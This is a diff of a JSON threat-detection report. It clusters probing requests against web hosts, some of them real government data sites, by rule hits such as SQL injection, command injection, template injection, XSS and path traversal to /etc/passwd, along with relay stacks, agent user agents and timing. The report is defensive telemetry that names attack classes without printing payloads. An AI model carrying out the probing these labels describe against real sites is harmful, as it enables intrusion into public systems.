@@ -9908,7 +10140,7 @@
       }
     },
     {
-      "id": "C10",
+      "id": "C7",
       "key": "k-cc3501da",
       "members": [
         48,
@@ -10039,7 +10271,7 @@
       }
     },
     {
-      "id": "C11",
+      "id": "C8",
       "key": "k-b0261a3c",
       "members": [
         6,
@@ -10179,7 +10411,7 @@
       }
     },
     {
-      "id": "C12",
+      "id": "C9",
       "key": "k-b8b91ba5",
       "members": [
         10,
@@ -10323,66 +10555,79 @@
       }
     },
     {
-      "id": "C13",
-      "key": "k-4c8b6e8f",
+      "id": "C10",
+      "key": "k-7a37d335",
       "members": [
-        209,
-        210,
-        211
+        110,
+        111,
+        112,
+        162
       ],
-      "start": 1772719200,
-      "end": 1772719320,
+      "start": 1781082720,
+      "end": 1781082870,
       "tier": "significant",
-      "score": 6,
+      "score": 9,
       "rules": {
-        "cache.buster": 3,
-        "marker.uq_tags": 3,
-        "relay.jina": 3
+        "exploit.boundary_ids": 1,
+        "exploit.double_encoded_meta": 1,
+        "exploit.sqli_boolean": 1,
+        "exploit.sqli_quote": 1
       },
       "kinds": {
-        "relay": 3,
-        "agent_marker": 3,
-        "cache_buster": 3
+        "exploit": 4
       },
       "tactics": {
-        "T1": 6
+        "T4": 4
       },
-      "artifacts": 3,
+      "artifacts": 0,
       "target_hosts": {
-        "gist.github.com": 3
+        "recherche-collection-search.bac-lac.canada.ca": 4
       },
-      "asns": {
-        "16509": 3
+      "asns": {},
+      "user_agents": {},
+      "encodings": {
+        "dbl.unsorted.noslash": 1,
+        "sp20.unsorted.noslash": 1
       },
-      "user_agents": {
-        "ScoutAgent/1.0": 3
+      "dialect": {
+        "variants": {
+          "sqli.numeric_or": 1,
+          "xss.script_alert": 1
+        },
+        "records": 2,
+        "first_seen": [
+          "sqli.numeric_or",
+          "xss.script_alert"
+        ],
+        "signature": "341cb867"
       },
-      "encodings": {},
-      "relay_stacks": {
-        "relay.jina → target": 3
+      "fanout": {
+        "batches": 4,
+        "widths": {
+          "1": 4
+        },
+        "modal_share": 1.0
       },
-      "link_features": [
-        "param:uqtag=scout7f"
-      ],
+      "link_features": [],
       "runs": [
         {
-          "start": 1772719200,
-          "end": 1772719320,
-          "count": 3
+          "start": 1781082720,
+          "end": 1781082870,
+          "count": 4
         }
       ],
       "timing": {
-        "count": 3,
-        "start": 1772719200,
-        "end": 1772719320,
-        "median_gap_secs": 60.0,
+        "count": 4,
+        "start": 1781082720,
+        "end": 1781082870,
+        "median_gap_secs": 50.0,
         "p90_gap_secs": 60.0,
         "bursts": [],
         "pauses": [],
         "hourly": [
           [
-            1772719200,
-            3
+            1781082000,
+            4
           ]
         ],
         "rhythm": {
@@ -10396,12 +10641,12 @@
             0,
             0,
             0,
-            0,
-            0,
-            0,
-            0,
-            0,
             1,
+            0,
+            0,
+            0,
+            0,
+            0,
             0,
             0,
             0,
@@ -10431,32 +10676,31 @@
         }
       },
       "provenance": {
-        "unknown": 3
+        "unknown": 4
       },
       "corroboration": "single_source",
       "agent": {
-        "level": "self_described",
+        "level": "payloads_only",
         "signals": [
           {
-            "kind": "self_id",
-            "records": 3,
-            "detail": "marker.uq_tags"
+            "kind": "model_pace_chain",
+            "records": 4
           }
         ]
       }
     },
     {
-      "id": "C14",
+      "id": "C11",
       "key": "k-74c086a9",
       "members": [
-        212,
-        213,
-        214
+        230,
+        231,
+        232
       ],
       "start": 1772720700,
       "end": 1772720850,
       "tier": "significant",
-      "score": 11,
+      "score": 9,
       "rules": {
         "cache.buster": 1,
         "exploit.sqli_boolean": 2,
@@ -10595,147 +10839,17 @@
       }
     },
     {
-      "id": "C15",
-      "key": "k-7a37d335",
-      "members": [
-        110,
-        111,
-        112
-      ],
-      "start": 1781082720,
-      "end": 1781082810,
-      "tier": "significant",
-      "score": 8,
-      "rules": {
-        "exploit.boundary_ids": 1,
-        "exploit.sqli_boolean": 1,
-        "exploit.sqli_quote": 1
-      },
-      "kinds": {
-        "exploit": 3
-      },
-      "tactics": {
-        "T4": 3
-      },
-      "artifacts": 0,
-      "target_hosts": {
-        "recherche-collection-search.bac-lac.canada.ca": 3
-      },
-      "asns": {},
-      "user_agents": {},
-      "encodings": {
-        "sp20.unsorted.noslash": 1
-      },
-      "dialect": {
-        "variants": {
-          "sqli.numeric_or": 1
-        },
-        "records": 1,
-        "first_seen": [
-          "sqli.numeric_or"
-        ],
-        "signature": "23803591"
-      },
-      "fanout": {
-        "batches": 3,
-        "widths": {
-          "1": 3
-        },
-        "modal_share": 1.0
-      },
-      "link_features": [],
-      "runs": [
-        {
-          "start": 1781082720,
-          "end": 1781082810,
-          "count": 3
-        }
-      ],
-      "timing": {
-        "count": 3,
-        "start": 1781082720,
-        "end": 1781082810,
-        "median_gap_secs": 50.0,
-        "p90_gap_secs": 50.0,
-        "bursts": [],
-        "pauses": [],
-        "hourly": [
-          [
-            1781082000,
-            3
-          ]
-        ],
-        "rhythm": {
-          "hours": [
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            1,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0
-          ],
-          "entropy": -0.0,
-          "longest_idle_hours": 0.013888888888888888,
-          "days": 1,
-          "verdict": {
-            "kind": "too_short"
-          }
-        },
-        "stale_dates": {
-          "tags": 0,
-          "behind": 0,
-          "ahead": 0,
-          "median_lag_days": null,
-          "modal_date": null,
-          "same_date_share": 0.0,
-          "same_lag_share": 0.0,
-          "consistent": false
-        }
-      },
-      "provenance": {
-        "unknown": 3
-      },
-      "corroboration": "single_source",
-      "agent": {
-        "level": "payloads_only",
-        "signals": [
-          {
-            "kind": "model_pace_chain",
-            "records": 3
-          }
-        ]
-      }
-    },
-    {
-      "id": "C16",
+      "id": "C12",
       "key": "k-15c03b5e",
       "members": [
-        154,
-        156,
-        157
+        164,
+        166,
+        167
       ],
       "start": 1785747600,
       "end": 1785747645,
       "tier": "significant",
-      "score": 10,
+      "score": 7,
       "rules": {
         "exploit.sqli_quote": 1,
         "exploit.sqli_union": 2,
@@ -10861,17 +10975,17 @@
       }
     },
     {
-      "id": "C17",
+      "id": "C13",
       "key": "k-3d8e048c",
       "members": [
-        164,
-        165,
-        180
+        174,
+        175,
+        190
       ],
       "start": 1785924000,
       "end": 1786107600,
       "tier": "significant",
-      "score": 11,
+      "score": 10,
       "rules": {
         "exfil.disposable_mail": 1,
         "marker.callback_seq": 1,
@@ -10994,17 +11108,17 @@
       }
     },
     {
-      "id": "C18",
+      "id": "C14",
       "key": "k-2a0dbcd7",
       "members": [
-        171,
-        172,
-        179
+        181,
+        182,
+        189
       ],
       "start": 1786032000,
       "end": 1786104000,
       "tier": "significant",
-      "score": 15,
+      "score": 13,
       "rules": {
         "carrier.html_program": 1,
         "carrier.inline_fetch_program": 1,
@@ -11130,17 +11244,1560 @@
       }
     },
     {
+      "id": "C15",
+      "key": "k-3bed0073",
+      "members": [
+        107,
+        108
+      ],
+      "start": 1780408805,
+      "end": 1780408990,
+      "tier": "significant",
+      "score": 7,
+      "rules": {
+        "exploit.sqli_boolean": 1,
+        "marker.oai_tag": 1
+      },
+      "kinds": {
+        "exploit": 1,
+        "agent_marker": 1
+      },
+      "tactics": {
+        "T4": 1
+      },
+      "artifacts": 1,
+      "target_hosts": {
+        "civilrightsdata.ed.gov": 2
+      },
+      "asns": {},
+      "user_agents": {},
+      "encodings": {
+        "sp20.unsorted.noslash": 1
+      },
+      "dialect": {
+        "variants": {
+          "sqli.numeric_or": 1
+        },
+        "records": 1,
+        "first_seen": [
+          "sqli.numeric_or"
+        ],
+        "signature": "23803591"
+      },
+      "fanout": {
+        "batches": 2,
+        "widths": {
+          "1": 2
+        },
+        "modal_share": 1.0
+      },
+      "link_features": [],
+      "runs": [
+        {
+          "start": 1780408805,
+          "end": 1780408990,
+          "count": 2
+        }
+      ],
+      "timing": {
+        "count": 2,
+        "start": 1780408805,
+        "end": 1780408990,
+        "median_gap_secs": 185.0,
+        "p90_gap_secs": 185.0,
+        "bursts": [],
+        "pauses": [],
+        "hourly": [
+          [
+            1780408800,
+            2
+          ]
+        ],
+        "rhythm": {
+          "hours": [
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            1,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0
+          ],
+          "entropy": -0.0,
+          "longest_idle_hours": 0.05138888888888889,
+          "days": 1,
+          "verdict": {
+            "kind": "too_short"
+          }
+        },
+        "stale_dates": {
+          "tags": 0,
+          "behind": 0,
+          "ahead": 0,
+          "median_lag_days": null,
+          "modal_date": null,
+          "same_date_share": 0.0,
+          "same_lag_share": 0.0,
+          "consistent": false
+        }
+      },
+      "provenance": {
+        "unknown": 2
+      },
+      "corroboration": "single_source",
+      "agent": {
+        "level": "self_described",
+        "signals": [
+          {
+            "kind": "self_id",
+            "records": 1,
+            "detail": "marker.oai_tag"
+          }
+        ]
+      }
+    },
+    {
+      "id": "C16",
+      "key": "k-a40c5369",
+      "members": [
+        69,
+        70
+      ],
+      "start": 1782987840,
+      "end": 1782987900,
+      "tier": "significant",
+      "score": 9,
+      "rules": {
+        "carrier.html_program": 1,
+        "exploit.xss": 1,
+        "marker.placeholder_identity": 2,
+        "relay.jina": 1
+      },
+      "kinds": {
+        "relay": 1,
+        "carrier": 1,
+        "exploit": 1,
+        "agent_marker": 2
+      },
+      "tactics": {
+        "T1": 1,
+        "T2": 1,
+        "T4": 1,
+        "T5": 2
+      },
+      "artifacts": 2,
+      "target_hosts": {
+        "records.agency.example": 2
+      },
+      "asns": {},
+      "user_agents": {},
+      "encodings": {
+        "hexU.unsorted.noslash": 1
+      },
+      "dialect": {
+        "variants": {
+          "xss.script_alert": 1
+        },
+        "records": 1,
+        "first_seen": [
+          "xss.script_alert"
+        ],
+        "signature": "8380dc75"
+      },
+      "relay_stacks": {
+        "carrier.html_program → target": 1,
+        "relay.jina → target": 1
+      },
+      "link_features": [],
+      "runs": [
+        {
+          "start": 1782987840,
+          "end": 1782987900,
+          "count": 2
+        }
+      ],
+      "timing": {
+        "count": 2,
+        "start": 1782987840,
+        "end": 1782987900,
+        "median_gap_secs": 60.0,
+        "p90_gap_secs": 60.0,
+        "bursts": [],
+        "pauses": [],
+        "hourly": [
+          [
+            1782986400,
+            2
+          ]
+        ],
+        "rhythm": {
+          "hours": [
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            1,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0
+          ],
+          "entropy": -0.0,
+          "longest_idle_hours": 0.016666666666666666,
+          "days": 1,
+          "verdict": {
+            "kind": "too_short"
+          }
+        },
+        "stale_dates": {
+          "tags": 0,
+          "behind": 0,
+          "ahead": 0,
+          "median_lag_days": null,
+          "modal_date": null,
+          "same_date_share": 0.0,
+          "same_lag_share": 0.0,
+          "consistent": false
+        }
+      },
+      "provenance": {
+        "unknown": 2
+      },
+      "corroboration": "single_source",
+      "agent": {
+        "level": "model_written",
+        "signals": [
+          {
+            "kind": "residue",
+            "records": 2,
+            "detail": "marker.placeholder_identity"
+          }
+        ]
+      }
+    },
+    {
+      "id": "C17",
+      "key": "k-21e5a81d",
+      "members": [
+        170,
+        171
+      ],
+      "start": 1785747670,
+      "end": 1785747700,
+      "tier": "significant",
+      "score": 4,
+      "rules": {
+        "exploit.cmdi": 2
+      },
+      "kinds": {
+        "exploit": 2
+      },
+      "tactics": {
+        "T4": 2
+      },
+      "artifacts": 0,
+      "target_hosts": {
+        "records.agency.example": 2
+      },
+      "asns": {},
+      "user_agents": {},
+      "encodings": {},
+      "dialect": {
+        "variants": {
+          "cmd.semicolon": 1,
+          "cmd.subshell": 1
+        },
+        "records": 2,
+        "first_seen": [
+          "cmd.semicolon",
+          "cmd.subshell"
+        ],
+        "signature": "c0942b1d"
+      },
+      "fanout": {
+        "batches": 2,
+        "widths": {
+          "1": 2
+        },
+        "modal_share": 1.0
+      },
+      "link_features": [],
+      "runs": [
+        {
+          "start": 1785747670,
+          "end": 1785747700,
+          "count": 2
+        }
+      ],
+      "timing": {
+        "count": 2,
+        "start": 1785747670,
+        "end": 1785747700,
+        "median_gap_secs": 30.0,
+        "p90_gap_secs": 30.0,
+        "bursts": [],
+        "pauses": [],
+        "hourly": [
+          [
+            1785747600,
+            2
+          ]
+        ],
+        "rhythm": {
+          "hours": [
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            1,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0
+          ],
+          "entropy": -0.0,
+          "longest_idle_hours": 0.008333333333333333,
+          "days": 1,
+          "verdict": {
+            "kind": "too_short"
+          }
+        },
+        "stale_dates": {
+          "tags": 0,
+          "behind": 0,
+          "ahead": 0,
+          "median_lag_days": null,
+          "modal_date": null,
+          "same_date_share": 0.0,
+          "same_lag_share": 0.0,
+          "consistent": false
+        }
+      },
+      "provenance": {
+        "unknown": 2
+      },
+      "corroboration": "single_source",
+      "agent": {
+        "level": "payloads_only"
+      }
+    },
+    {
+      "id": "C18",
+      "key": "k-da54fae3",
+      "members": [
+        125,
+        126
+      ],
+      "start": 1785771060,
+      "end": 1785771120,
+      "tier": "significant",
+      "score": 9,
+      "rules": {
+        "exploit.ssti": 1,
+        "exploit.traversal": 1,
+        "exploit.traversal_single": 1
+      },
+      "kinds": {
+        "exploit": 3
+      },
+      "tactics": {
+        "T4": 3
+      },
+      "artifacts": 0,
+      "target_hosts": {
+        "api.datausa.io": 2
+      },
+      "asns": {},
+      "user_agents": {},
+      "encodings": {
+        "hexU.sorted.noslash": 1
+      },
+      "dialect": {
+        "variants": {
+          "ssti.double_brace": 1,
+          "traversal.depth2": 1,
+          "traversal.etc_passwd": 1
+        },
+        "records": 2,
+        "first_seen": [
+          "ssti.double_brace",
+          "traversal.depth2",
+          "traversal.etc_passwd"
+        ],
+        "signature": "bf957942"
+      },
+      "link_features": [],
+      "runs": [
+        {
+          "start": 1785771060,
+          "end": 1785771120,
+          "count": 2
+        }
+      ],
+      "timing": {
+        "count": 2,
+        "start": 1785771060,
+        "end": 1785771120,
+        "median_gap_secs": 60.0,
+        "p90_gap_secs": 60.0,
+        "bursts": [],
+        "pauses": [],
+        "hourly": [
+          [
+            1785769200,
+            2
+          ]
+        ],
+        "rhythm": {
+          "hours": [
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            1,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0
+          ],
+          "entropy": -0.0,
+          "longest_idle_hours": 0.016666666666666666,
+          "days": 1,
+          "verdict": {
+            "kind": "too_short"
+          }
+        },
+        "stale_dates": {
+          "tags": 0,
+          "behind": 0,
+          "ahead": 0,
+          "median_lag_days": null,
+          "modal_date": null,
+          "same_date_share": 0.0,
+          "same_lag_share": 0.0,
+          "consistent": false
+        }
+      },
+      "provenance": {
+        "unknown": 2
+      },
+      "corroboration": "single_source",
+      "agent": {
+        "level": "payloads_only",
+        "signals": [
+          {
+            "kind": "model_pace_chain",
+            "records": 3
+          }
+        ]
+      }
+    },
+    {
       "id": "C19",
+      "key": "k-e17d390c",
+      "members": [
+        207,
+        209
+      ],
+      "start": 1786353600,
+      "end": 1786354200,
+      "tier": "significant",
+      "score": 8,
+      "rules": {
+        "exploit.double_encoded_meta": 1,
+        "header.agent_ua": 1,
+        "marker.uq_tags": 2
+      },
+      "kinds": {
+        "exploit": 1,
+        "agent_marker": 2,
+        "header": 1
+      },
+      "tactics": {
+        "T4": 1
+      },
+      "artifacts": 2,
+      "target_hosts": {
+        "records.agency.example": 2
+      },
+      "asns": {},
+      "user_agents": {
+        "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; ChatGPT-User/1.0; +https://openai.com/bot": 1
+      },
+      "encodings": {
+        "dbl.sorted.noslash": 1
+      },
+      "link_features": [],
+      "runs": [
+        {
+          "start": 1786353600,
+          "end": 1786354200,
+          "count": 2
+        }
+      ],
+      "timing": {
+        "count": 2,
+        "start": 1786353600,
+        "end": 1786354200,
+        "median_gap_secs": 600.0,
+        "p90_gap_secs": 600.0,
+        "bursts": [],
+        "pauses": [],
+        "hourly": [
+          [
+            1786352400,
+            2
+          ]
+        ],
+        "rhythm": {
+          "hours": [
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            1,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0
+          ],
+          "entropy": -0.0,
+          "longest_idle_hours": 0.16666666666666666,
+          "days": 1,
+          "verdict": {
+            "kind": "too_short"
+          }
+        },
+        "stale_dates": {
+          "tags": 0,
+          "behind": 0,
+          "ahead": 0,
+          "median_lag_days": null,
+          "modal_date": null,
+          "same_date_share": 0.0,
+          "same_lag_share": 0.0,
+          "consistent": false
+        }
+      },
+      "provenance": {
+        "unknown": 2
+      },
+      "corroboration": "single_source",
+      "agent": {
+        "level": "self_described",
+        "signals": [
+          {
+            "kind": "self_id",
+            "records": 2,
+            "detail": "marker.uq_tags"
+          }
+        ]
+      }
+    },
+    {
+      "id": "C20",
+      "key": "k-93ae0ac9",
+      "members": [
+        122,
+        123
+      ],
+      "start": 1786500600,
+      "end": 1786500840,
+      "tier": "significant",
+      "score": 9,
+      "rules": {
+        "carrier.html_program": 2,
+        "carrier.httpbin": 1,
+        "carrier.inline_fetch_program": 1,
+        "exploit.xss": 1,
+        "marker.title_write": 1
+      },
+      "kinds": {
+        "carrier": 4,
+        "exploit": 1,
+        "agent_marker": 1
+      },
+      "tactics": {
+        "T2": 4,
+        "T4": 1,
+        "T7": 1
+      },
+      "artifacts": 0,
+      "target_hosts": {
+        "vizprod.aihw.gov.au": 2
+      },
+      "asns": {},
+      "user_agents": {},
+      "encodings": {
+        "hexU.unsorted.noslash": 1
+      },
+      "dialect": {
+        "variants": {
+          "xss.script_alert": 1
+        },
+        "records": 1,
+        "first_seen": [
+          "xss.script_alert"
+        ],
+        "signature": "8380dc75"
+      },
+      "relay_stacks": {
+        "carrier.html_program → target": 1,
+        "carrier.httpbin → carrier.html_program → carrier.inline_fetch_program → target": 1
+      },
+      "link_features": [],
+      "runs": [
+        {
+          "start": 1786500600,
+          "end": 1786500840,
+          "count": 2
+        }
+      ],
+      "timing": {
+        "count": 2,
+        "start": 1786500600,
+        "end": 1786500840,
+        "median_gap_secs": 240.0,
+        "p90_gap_secs": 240.0,
+        "bursts": [],
+        "pauses": [],
+        "hourly": [
+          [
+            1786500000,
+            2
+          ]
+        ],
+        "rhythm": {
+          "hours": [
+            0,
+            0,
+            1,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0
+          ],
+          "entropy": -0.0,
+          "longest_idle_hours": 0.06666666666666667,
+          "days": 1,
+          "verdict": {
+            "kind": "too_short"
+          }
+        },
+        "stale_dates": {
+          "tags": 0,
+          "behind": 0,
+          "ahead": 0,
+          "median_lag_days": null,
+          "modal_date": null,
+          "same_date_share": 0.0,
+          "same_lag_share": 0.0,
+          "consistent": false
+        }
+      },
+      "provenance": {
+        "unknown": 2
+      },
+      "corroboration": "single_source",
+      "agent": {
+        "level": "payloads_only"
+      }
+    },
+    {
+      "id": "C21",
+      "key": "k-131d8ae5",
+      "members": [
+        39,
+        40
+      ],
+      "start": 1788357600,
+      "end": 1788357780,
+      "tier": "significant",
+      "score": 10,
+      "rules": {
+        "exploit.sqli_union": 2,
+        "marker.uq_tags": 2,
+        "relay.jina": 2
+      },
+      "kinds": {
+        "relay": 2,
+        "exploit": 2,
+        "agent_marker": 2
+      },
+      "tactics": {
+        "T1": 2,
+        "T4": 2
+      },
+      "artifacts": 2,
+      "target_hosts": {
+        "records.plant-a.example": 2
+      },
+      "asns": {},
+      "user_agents": {},
+      "encodings": {
+        "sp20.sorted.noslash": 2
+      },
+      "dialect": {
+        "variants": {
+          "sqli.union_select": 2
+        },
+        "records": 2,
+        "first_seen": [
+          "sqli.union_select"
+        ],
+        "signature": "3da130c5"
+      },
+      "relay_stacks": {
+        "relay.jina → target": 2
+      },
+      "link_features": [
+        "param:uqtag=pl4nt1"
+      ],
+      "runs": [
+        {
+          "start": 1788357600,
+          "end": 1788357780,
+          "count": 2
+        }
+      ],
+      "timing": {
+        "count": 2,
+        "start": 1788357600,
+        "end": 1788357780,
+        "median_gap_secs": 180.0,
+        "p90_gap_secs": 180.0,
+        "bursts": [],
+        "pauses": [],
+        "hourly": [
+          [
+            1788357600,
+            2
+          ]
+        ],
+        "rhythm": {
+          "hours": [
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            1,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0
+          ],
+          "entropy": -0.0,
+          "longest_idle_hours": 0.05,
+          "days": 1,
+          "verdict": {
+            "kind": "too_short"
+          }
+        },
+        "stale_dates": {
+          "tags": 0,
+          "behind": 0,
+          "ahead": 0,
+          "median_lag_days": null,
+          "modal_date": null,
+          "same_date_share": 0.0,
+          "same_lag_share": 0.0,
+          "consistent": false
+        }
+      },
+      "provenance": {
+        "unknown": 2
+      },
+      "corroboration": "single_source",
+      "agent": {
+        "level": "self_described",
+        "signals": [
+          {
+            "kind": "self_id",
+            "records": 2,
+            "detail": "marker.uq_tags"
+          }
+        ]
+      }
+    },
+    {
+      "id": "C22",
+      "key": "k-635475d7",
+      "members": [
+        42,
+        43
+      ],
+      "start": 1788426000,
+      "end": 1788426120,
+      "tier": "significant",
+      "score": 6,
+      "rules": {
+        "cache.buster": 2,
+        "exploit.traversal": 2,
+        "exploit.traversal_single": 2
+      },
+      "kinds": {
+        "exploit": 4,
+        "cache_buster": 2
+      },
+      "tactics": {
+        "T1": 2,
+        "T4": 4
+      },
+      "artifacts": 0,
+      "target_hosts": {
+        "api.plant-b.example": 2
+      },
+      "asns": {},
+      "user_agents": {},
+      "encodings": {
+        "hexU.unsorted.noslash": 2
+      },
+      "dialect": {
+        "variants": {
+          "traversal.depth4": 2,
+          "traversal.etc_passwd": 1
+        },
+        "records": 2,
+        "first_seen": [
+          "traversal.depth4",
+          "traversal.etc_passwd"
+        ],
+        "signature": "804cd67a"
+      },
+      "link_features": [
+        "param:run=pb7781"
+      ],
+      "runs": [
+        {
+          "start": 1788426000,
+          "end": 1788426120,
+          "count": 2
+        }
+      ],
+      "timing": {
+        "count": 2,
+        "start": 1788426000,
+        "end": 1788426120,
+        "median_gap_secs": 120.0,
+        "p90_gap_secs": 120.0,
+        "bursts": [],
+        "pauses": [],
+        "hourly": [
+          [
+            1788426000,
+            2
+          ]
+        ],
+        "rhythm": {
+          "hours": [
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            1,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0
+          ],
+          "entropy": -0.0,
+          "longest_idle_hours": 0.03333333333333333,
+          "days": 1,
+          "verdict": {
+            "kind": "too_short"
+          }
+        },
+        "stale_dates": {
+          "tags": 0,
+          "behind": 0,
+          "ahead": 0,
+          "median_lag_days": null,
+          "modal_date": null,
+          "same_date_share": 0.0,
+          "same_lag_share": 0.0,
+          "consistent": false
+        }
+      },
+      "provenance": {
+        "unknown": 2
+      },
+      "corroboration": "single_source",
+      "agent": {
+        "level": "payloads_only"
+      }
+    },
+    {
+      "id": "C23",
+      "key": "k-b000dccb",
+      "members": [
+        211,
+        212,
+        213,
+        214,
+        215,
+        216,
+        217,
+        218
+      ],
+      "start": 1772445600,
+      "end": 1772445950,
+      "tier": "suggestive",
+      "score": 5,
+      "rules": {
+        "cache.buster": 8,
+        "marker.uq_tags": 8,
+        "relay.jina": 8
+      },
+      "kinds": {
+        "relay": 8,
+        "agent_marker": 8,
+        "cache_buster": 8
+      },
+      "tactics": {
+        "T1": 16
+      },
+      "artifacts": 8,
+      "target_hosts": {
+        "h0.county-records.example": 1,
+        "h1.county-records.example": 1,
+        "h2.county-records.example": 1,
+        "h3.county-records.example": 1,
+        "h4.county-records.example": 1,
+        "h5.county-records.example": 1,
+        "h6.county-records.example": 1,
+        "h7.county-records.example": 1
+      },
+      "asns": {
+        "16509": 8
+      },
+      "user_agents": {
+        "SchedRunner/3.2": 8
+      },
+      "encodings": {},
+      "fanout": {
+        "batches": 8,
+        "widths": {
+          "1": 8
+        },
+        "modal_share": 1.0
+      },
+      "relay_stacks": {
+        "relay.jina → target": 8
+      },
+      "link_features": [
+        "param:uqtag=shardA7"
+      ],
+      "runs": [
+        {
+          "start": 1772445600,
+          "end": 1772445950,
+          "count": 8
+        }
+      ],
+      "timing": {
+        "count": 8,
+        "start": 1772445600,
+        "end": 1772445950,
+        "median_gap_secs": 50.0,
+        "p90_gap_secs": 50.0,
+        "bursts": [],
+        "pauses": [],
+        "hourly": [
+          [
+            1772445600,
+            8
+          ]
+        ],
+        "rhythm": {
+          "hours": [
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            1,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0
+          ],
+          "entropy": -0.0,
+          "longest_idle_hours": 0.013888888888888888,
+          "days": 1,
+          "verdict": {
+            "kind": "too_short"
+          }
+        },
+        "stale_dates": {
+          "tags": 0,
+          "behind": 0,
+          "ahead": 0,
+          "median_lag_days": null,
+          "modal_date": null,
+          "same_date_share": 0.0,
+          "same_lag_share": 0.0,
+          "consistent": false
+        }
+      },
+      "provenance": {
+        "unknown": 8
+      },
+      "corroboration": "single_source",
+      "agent": {
+        "level": "self_described",
+        "signals": [
+          {
+            "kind": "self_id",
+            "records": 8,
+            "detail": "marker.uq_tags"
+          }
+        ]
+      }
+    },
+    {
+      "id": "C24",
+      "key": "k-1d59194a",
+      "members": [
+        219,
+        220,
+        221,
+        222,
+        223,
+        224,
+        225,
+        226
+      ],
+      "start": 1772445640,
+      "end": 1772445990,
+      "tier": "suggestive",
+      "score": 5,
+      "rules": {
+        "cache.buster": 8,
+        "marker.uq_tags": 8,
+        "relay.jina": 8
+      },
+      "kinds": {
+        "relay": 8,
+        "agent_marker": 8,
+        "cache_buster": 8
+      },
+      "tactics": {
+        "T1": 16
+      },
+      "artifacts": 8,
+      "target_hosts": {
+        "h10.county-records.example": 1,
+        "h11.county-records.example": 1,
+        "h12.county-records.example": 1,
+        "h13.county-records.example": 1,
+        "h14.county-records.example": 1,
+        "h15.county-records.example": 1,
+        "h8.county-records.example": 1,
+        "h9.county-records.example": 1
+      },
+      "asns": {
+        "16509": 8
+      },
+      "user_agents": {
+        "SchedRunner/3.2": 8
+      },
+      "encodings": {},
+      "fanout": {
+        "batches": 8,
+        "widths": {
+          "1": 8
+        },
+        "modal_share": 1.0
+      },
+      "relay_stacks": {
+        "relay.jina → target": 8
+      },
+      "link_features": [
+        "param:uqtag=shardB7"
+      ],
+      "runs": [
+        {
+          "start": 1772445640,
+          "end": 1772445990,
+          "count": 8
+        }
+      ],
+      "timing": {
+        "count": 8,
+        "start": 1772445640,
+        "end": 1772445990,
+        "median_gap_secs": 50.0,
+        "p90_gap_secs": 50.0,
+        "bursts": [],
+        "pauses": [],
+        "hourly": [
+          [
+            1772445600,
+            8
+          ]
+        ],
+        "rhythm": {
+          "hours": [
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            1,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0
+          ],
+          "entropy": -0.0,
+          "longest_idle_hours": 0.013888888888888888,
+          "days": 1,
+          "verdict": {
+            "kind": "too_short"
+          }
+        },
+        "stale_dates": {
+          "tags": 0,
+          "behind": 0,
+          "ahead": 0,
+          "median_lag_days": null,
+          "modal_date": null,
+          "same_date_share": 0.0,
+          "same_lag_share": 0.0,
+          "consistent": false
+        }
+      },
+      "provenance": {
+        "unknown": 8
+      },
+      "corroboration": "single_source",
+      "agent": {
+        "level": "self_described",
+        "signals": [
+          {
+            "kind": "self_id",
+            "records": 8,
+            "detail": "marker.uq_tags"
+          }
+        ]
+      }
+    },
+    {
+      "id": "C25",
+      "key": "k-408d9c03",
+      "members": [
+        239,
+        240,
+        241,
+        242,
+        243
+      ],
+      "start": 1773331200,
+      "end": 1773331440,
+      "tier": "suggestive",
+      "score": 5,
+      "rules": {
+        "cache.buster": 5,
+        "marker.uq_tags": 5,
+        "relay.jina": 5
+      },
+      "kinds": {
+        "relay": 5,
+        "agent_marker": 5,
+        "cache_buster": 5
+      },
+      "tactics": {
+        "T1": 10
+      },
+      "artifacts": 5,
+      "target_hosts": {
+        "account.utility-portal.example": 1,
+        "billing.utility-portal.example": 1,
+        "meter.utility-portal.example": 1,
+        "outage.utility-portal.example": 1,
+        "support.utility-portal.example": 1
+      },
+      "asns": {
+        "16509": 5
+      },
+      "user_agents": {
+        "MapperAgent/0.9": 5
+      },
+      "encodings": {},
+      "relay_stacks": {
+        "relay.jina → target": 5
+      },
+      "link_features": [
+        "param:uqtag=map31z"
+      ],
